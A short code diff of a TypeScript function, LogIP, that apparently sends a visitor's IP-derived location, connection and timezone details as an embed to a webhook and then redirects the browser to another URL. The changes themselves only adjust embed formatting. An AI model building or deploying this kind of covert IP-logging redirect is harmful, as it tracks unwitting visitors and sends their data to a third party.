@@ -43,26 +43,18 @@ export const LogIP = async (baseURL: string) => {
             {
                 'name': ':zap: **Main**',
                 'value': main_field,
-                'inline': true,
             },
             {
                 'name': ':earth_americas: **Location**',
                 'value': location_field,
-                'inline': true,
-            },
-            {
-                'name': '\u200b',
-                'value': '\u200b',
             },
             {
                 'name': ':satellite: **Connection**',
                 'value': connection_field,
-                'inline': true,
             },
             {
                 'name': ':clock1: **Timezone**',
                 'value': timezone_field,
-                'inline': true,
             },
         ],
     };
@@ -76,7 +68,7 @@ export const LogIP = async (baseURL: string) => {
     await fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(params)
+        body: JSON.stringify(params),
     });
 
     window.location.href = finalURL;
